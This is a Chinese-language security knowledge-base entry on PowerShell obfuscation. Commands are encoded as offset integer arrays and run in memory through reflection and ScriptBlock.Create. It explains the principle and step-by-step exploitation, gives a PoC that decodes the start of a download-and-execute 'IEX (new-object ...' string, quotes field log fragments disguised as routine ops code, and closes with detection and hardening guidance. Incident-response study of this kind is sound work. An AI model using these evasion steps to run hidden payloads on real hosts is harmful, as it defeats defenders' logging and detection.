---
id: code-analysis-reverse-obfuscation-powershell-integer-array-scriptblock
title: 整数数组编码的 PowerShell 混淆与 ScriptBlock 内存执行
type: scenario
domain: code-analysis
path: code-analysis/reverse/obfuscation
technique: powershell-integer-array-obfuscation
aliases:
- PowerShell 整数数组混淆
- 字符码混淆
- ScriptBlock.Create
- 内存执行 PowerShell
tags:
- powershell
- obfuscation
- scriptblock
- defense-evasion
- incident-response
- windows
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-D
  verified_at: '2026-11-04T19:21:08+08:00'
  notes: 已对照原文与4104日志图核对：首段202,198,217...减129还原IEX、类型名数组减23还原System.Management.Automation.ScriptBlock、明文Create数组与&$sb执行均一致；核对时修正了PoC中Create数组的偏移笔误；PoC未实际执行。
---

## 一句话结论

把待执行字符串拆成整数数组，运行时对每个元素减去固定偏移再转成字符拼接，最后用 `ScriptBlock.Create` 在内存中编译并执行；脚本本身看不到明文命令，能绕过基于字符串的检测。

## 原理

- PowerShell 中 `[char]65` 得到 `A`，整数数组可以表示任意字符串。攻击者给每个字符码加一个固定偏移（如 +129、+23），运行时统一减去即可还原。
- 偏移后的数组只是一串数字，不含 `IEX`、`DownloadString`、`System.Management.Automation.ScriptBlock` 等敏感字符串，静态字符串匹配和部分 AV 规则会失效。
- 还原后的第一段通常是下载执行脚本（`IEX (New-Object Net.WebClient).DownloadString(...)`）；第二段用于反射获取 `System.Management.Automation.ScriptBlock` 类型，再 `GetMethod("Create")` 编译字符串为脚本块，`&$sb` 执行。
- 使用 `ScriptBlock.Create` 而非 `Invoke-Expression`，可以避开部分针对 `IEX`/`Invoke-Expression` 的规则；脚本块仍在当前 PowerShell 进程内存中运行，不落盘。
- 变量名伪装成 `$Timestamp`、`$LogFile`、`$ConfigPath`，并加 `# Update service mesh routing table #` 之类的正常运维注释，降低人工审计的警觉。

## 触发条件

- 攻击者已能在 Windows 主机上执行 PowerShell（Web 漏洞 RCE、计划任务、横向移动等）。
- PowerShell 未启用 Constrained Language Mode，允许 `Add-Type`/反射/`ScriptBlock.Create` 等操作。
- 目标未开启完整的 Script Block Logging（4104），或日志未被集中采集分析。

## 利用步骤

1. 把要执行的脚本按字符转成码点，加上统一偏移（如 129），生成整数数组。
2. 脚本运行时用 `-join ($array | ForEach-Object { [char]($_ - 129) })` 还原第一段。
3. 第一段通过 `IEX`/`DownloadString` 拉取第二阶段载荷，或直接拼接命令。
4. 第二阶段用另一偏移还原类型名，反射取得 `ScriptBlock.Create` 并执行还原后的脚本。
5. 清理变量、删除落地文件；脚本块只存在于进程内存。

## PoC

```powershell
# 解码模式（示意，数组为现场样本前缀）
$reportEntry88 = @(202,198,217,161,169,239,230,248,174,240,227,235,230,228,245,161)
$serverList34 = 129
$sessionData55 = -join ($reportEntry88 | ForEach-Object { [char]($_ - $serverList34) })
# 得到以 "IEX" 开头的下载执行字符串

# 反射调用 ScriptBlock.Create（类型名数组偏移为 23）
$_t = [type](-join (@(106,144,138,139,124,132,69,100,120,133) | ForEach-Object { [char]($_ - 23) }))
# 上面为数组前缀，解码为 System.Man...，完整数组还原为 System.Management.Automation.ScriptBlock
$_m = $_t.GetMethod(-join (@(67,114,101,97,116,101) | ForEach-Object { [char]$_ }))
# -> Create（现场样本中该方法名数组为明文 ASCII，未加偏移）
$sb = $_m.Invoke($null, @($sessionData55))
& $sb
```

```text
# 现场 4104 日志中的特征：
# Update service mesh routing table #>$Timestamp = $PID; $LogFile = $env:TEMP;
# $reportEntry88=@(202,198,...); $serverList34=129;
# ${_t=[type](-join(@(106,144,...)%[char]($_-23)))}; $_m=$_t.GetMethod(...); &$sb
```

## 变体与关联

- 变体：偏移量可正可负，或每字符使用不同偏移；也可用 XOR、Base64、十六进制字符串替代整数数组。
- 变体：用 `[ScriptBlock]::Create()`、`New-Object ScriptBlock`、`Invoke-Expression` 或 `powershell -EncodedCommand` 实现同类内存执行。
- 变体：注释和变量名伪装成运维/云厂商术语，如 “Update service mesh routing table”。
- 关联：与 PowerShell 下载落地 WebShell、计划任务持久化、C2 回连常组合出现。

## 检测与防御

- 检测：4104 日志中出现大段整数数组、`%[char]`、`-join`、`GetMethod(`、`ScriptBlock.Create`、`&$sb`、`Invoke` 组合。
- 检测：同一脚本块内同时出现 `Get-Process`、`Split-Path`、`DownloadFile`、`webapps` 等落地上传特征。
- 检测：对可疑整数数组离线解码，还原下载地址、落地路径和命令；不要只匹配明文关键词。
- 防御：启用 PowerShell Script Block Logging 与 Module Logging，集中采集 4104/4103；开启 AMSI。
- 防御：对 Web/应用服务器启用 Constrained Language Mode、AppLocker/WDAC，限制 `powershell.exe` 由服务进程拉起。
- 加固：应用进程最小权限运行，出站流量白名单，减少被 RCE 后直接下载执行的可能。
